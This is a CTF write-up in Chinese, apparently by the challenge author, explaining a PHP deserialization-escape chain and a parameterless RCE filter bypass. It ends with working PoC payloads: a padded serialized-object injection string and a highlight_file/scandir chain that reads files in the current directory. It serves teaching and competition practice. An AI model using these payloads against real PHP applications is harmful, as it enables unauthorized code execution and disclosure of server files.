## 考点

PHP反序列化+无参RCE

## 工具

不需要什么特别的工具；但建议在本地搭建PHP环境进行测试，以及通过PHP脚本生成payload的部分内容。

## 步骤

### 1、雕虫小技

前端加了一些雕虫小技阻止大家获取代码，但必然是拦不住大家的。

### 2、构建反列化链

需要进行RCE就得进入Admin的`__toString`方法。

注意到admin的`__call` 方法中会输出$this->admin，所以我们需要让Admin对象中的admin属性仍是Admin对象。

`__call`在类的一个不存在的方法被调用时触发；控制Guest类的information属性为Admin对象，即可调用Admin的confirm方法(不存在)，进而触发`Admin::__call`。

在我们进行正常输入时，生成的序列化内容的可控性不强；但是，程序在序列化字符串生成后进行了字符替换，这就造成了反序列化逃逸。虽然替换了某些字符，但序列化信息中对应的属性长度是不会变的，这就导致它会“吃掉”后面的部分内容，精心设计，就可以实现任意序列化内容的构建。

### 3、无参RCE

不同于X-Forwarded-for或client-ip，Remote-Addr一般情况下难以伪造，所以要想进行命令执行必须走'limited shell'那一路。

`preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $shellcode)`是无参RCE过滤的关键部分，它的意思是递归的过滤形如`XXX(xxx())`

的内容，举例来说，`abc(ajakfra(fahefha(fakfeaf(hepotidhb()))))`是合法的，但`system('ls \')`因为最内层括号有参数，是不合法的。在【**1**】中，我们dirsearch时应该还看到了个flag.php，所以目标是当前目录下的任意读。

给出payload并解释：`shell=highlight_file(array_rand(array_flip(scandir(pos(localeconv())))));`

pos(localeconv())配合获得【'.'】字符；scandir('.')扫描当前目录;array_flip() 交换数组的键和值；array_rand() 返回数组中的随机键名。这个payload的作用是随机读取并显示当前目录下的文件；多执行几次，就能读到flag.php

## 总结

这个题目出完后其实总体难度略低于我的预期；主要是因为水平有限+从提供服务的角度来讲，代码逻辑需要基本自洽，所以我设计的反序列化链有点短。最后的无参RCE也没有用什么额外的心机，网上一搜一堆，注意一下过滤了current而pos可等价替代current 就行了。不过本题对于接触web较少的同学来说难度应该并不低；毕竟还是涉及了很多经典知识点的。

### poc

`name=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&age=0&height=0&weight=;s:11:"information";O:5:"Admin":1:{s:5:"admin";O:5:"Admin":1:{s:5:"admin";s:6:"hidden";}}}`

`shell=highlight_file(array_rand(array_flip(scandir(pos(localeconv())))));`